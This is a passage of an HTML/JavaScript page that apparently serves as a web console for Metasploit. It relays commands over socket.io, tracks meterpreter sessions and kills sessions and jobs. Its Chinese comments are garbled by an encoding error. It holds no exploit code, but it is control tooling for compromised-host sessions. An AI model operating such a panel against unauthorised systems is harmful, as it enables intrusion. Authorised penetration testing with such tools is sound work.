            if (!sidebarOpen) toggleSidebar(true);
            // å¦‚æœæœ‰OSä¿¡æ¯ï¼Œæ›´æ–°ä¾§è¾¹æ æ˜¾ç¤º
            if (sessions[id]) {
                selectSession(id, sessions[id].os);
            }
        }

        function killSessionById(id) {
            const sid = String(id);
            if (confirm(`ç¡®å®šå…³é—­ä¼šè¯ ${sid}?`)) {
                quickCmd(`sessions -k ${sid}`);
                if (String(currentSessionId) === sid) {
                    currentSessionId = null;
                    toggleSidebar(false);
                    // é‡ç½®ä¾§è¾¹æ çŠ¶æ€
                    document.getElementById('noSessionHint').classList.remove('hidden');
                    document.getElementById('windowsActions').classList.add('hidden');
                    document.getElementById('linuxActions').classList.add('hidden');
                    document.getElementById('commonActions').classList.add('hidden');
                    document.getElementById('sessionInfo').classList.add('hidden');
                    document.getElementById('sidebarTitle').textContent = 'ä¼šè¯æ§åˆ¶å°';
                    document.getElementById('sidebarSubtitle').textContent = 'é€‰æ‹©ä¸€ä¸ªä¼šè¯';
                }
                setTimeout(refreshSessions, 1000);
            }
        }

        function killJob(id) {
            if (confirm(`ç¡®å®šåœæ­¢ä»»åŠ¡ ${id}?`)) {
                quickCmd(`jobs -k ${id}`);
                setTimeout(refreshJobs, 1000);
            }
        }

        function logOutput(text) {
            output.innerText += text;
            container.scrollTop = container.scrollHeight;
        }

        function sendCommand() {
            const cmd = cmdInput.value;
            if (cmd.trim()) {
                // æ£€æµ‹ç”¨æˆ·æ˜¯å¦é€šè¿‡å‘½ä»¤è¡Œåˆ‡æ¢ä¼šè¯æ¨¡å¼
                if (cmd.trim() === 'background' || cmd.trim() === 'bg') {
                    inSessionMode = false;
                    logOutput(`\n[GUI] ä¼šè¯è½¬å…¥åå°\n`);
                } else if (cmd.trim().startsWith('sessions -i ') || cmd.trim().startsWith('session -i ')) {
                    inSessionMode = true;
                    const match = cmd.match(/sessions?\s+-i\s+(\d+)/i);
                    if (match) {
                        currentSessionId = match[1];
                        logOutput(`\n[GUI] è¿›å…¥ä¼šè¯ ${currentSessionId}\n`);
                    }
                } else if (cmd.trim().startsWith('sessions -k') || cmd.trim().startsWith('sessions -K')) {
                    inSessionMode = false;
                } else if (inSessionMode) {
                    logOutput(`\nmeterpreter > ${cmd}\n`);
                } else {
                    logOutput(`\nmsf6 > ${cmd}\n`);
                }
                socket.emit('msf-input', cmd);
            }
            cmdInput.value = '';
        }

        function killSession() {
            if (confirm("ç¡®å®šé‡ç½®MSFä¼šè¯?")) {
                socket.emit('kill-msf');
                output.innerText = '';
                currentSessionId = null;
                inSessionMode = false;
                sessions = {};
                setTimeout(() => socket.emit('start-msf'), 1000);
            }
        }

        // Socket äº‹ä»¶
        socket.on('connect', () => {
            statusEl.innerText = "Connected";
            statusEl.className = "text-[10px] px-2 py-0.5 rounded bg-green-900/50 text-green-400";
            socket.emit('start-msf');
            logOutput('[SYSTEM] å·²è¿æ¥åˆ°æœåŠ¡å™¨ï¼Œæ­£åœ¨å¯åŠ¨ MSF...\n');
            // è¿æ¥åè‡ªåŠ¨åˆ·æ–°ä¼šè¯åˆ—è¡¨
            setTimeout(refreshSessions, 3000);
        });

        socket.on('disconnect', () => {
            statusEl.innerText = "Disconnected";
            statusEl.className = "text-[10px] px-2 py-0.5 rounded bg-red-900/50 text-red-400";
            inSessionMode = false;
        });

        socket.on('msf-output', (data) => {
            const clean = data.replace(/\x1B\[[0-9;]*[mK]/g, '');

            // è‡ªåŠ¨æ£€æµ‹ä¼šè¯æ¨¡å¼å˜åŒ–
            if (clean.includes('meterpreter >') || clean.includes('shell >')) {
                inSessionMode = true;
            } else if (clean.includes('msf') && clean.includes('>') && !clean.includes('meterpreter')) {
                // è¿”å›åˆ° MSF ä¸»ç•Œé¢
                if (inSessionMode && !isRefreshing) {
                    // åªæœ‰å½“ä¸æ˜¯åœ¨åˆ·æ–°ä¼šè¯åˆ—è¡¨æ—¶æ‰é‡ç½®
                    // inSessionMode = false;  // æš‚æ—¶æ³¨é‡Šï¼Œé¿å…è¯¯åˆ¤
                }
            }

            // è‡ªåŠ¨æ£€æµ‹æ–°ä¼šè¯å¹¶åˆ·æ–°åˆ—è¡¨
            if (clean.toLowerCase().includes('meterpreter session') && clean.includes('opened')) {
                console.log('[DEBUG] Session opened detected, refreshing...');
                setTimeout(refreshSessions, 1500);
            }

            // æ£€æµ‹ä¼šè¯åˆ—è¡¨è¾“å‡ºï¼ˆå½“è¾“å‡ºåŒ…å« "Active sessions" æ—¶ï¼‰
            if (clean.includes('Active sessions') || clean.includes('active sessions')) {
                console.log('[DEBUG] Session list output detected');
            }

            if (isRefreshing) {
                buffer += clean;
                // æ£€æµ‹ MSF æç¤ºç¬¦ï¼Œè¡¨ç¤ºå‘½ä»¤æ‰§è¡Œå®Œæˆ
                if (clean.match(/msf\d*\s*>\s*$/) || clean.match(/meterpreter\s*>\s*$/)) {
                    isRefreshing = false;
                    console.log('[DEBUG] Buffer content for parsing:', buffer.substring(0, 500));
                    if (refreshType === 'sessions') {
                        parseSessions(buffer);
                    } else {
                        parseJobs(buffer);
                    }
                }
                return;
            }

            output.innerText += clean;
            container.scrollTop = container.scrollHeight;
        });

        cmdInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') sendCommand();
        });
    </script>
</body>
</html>
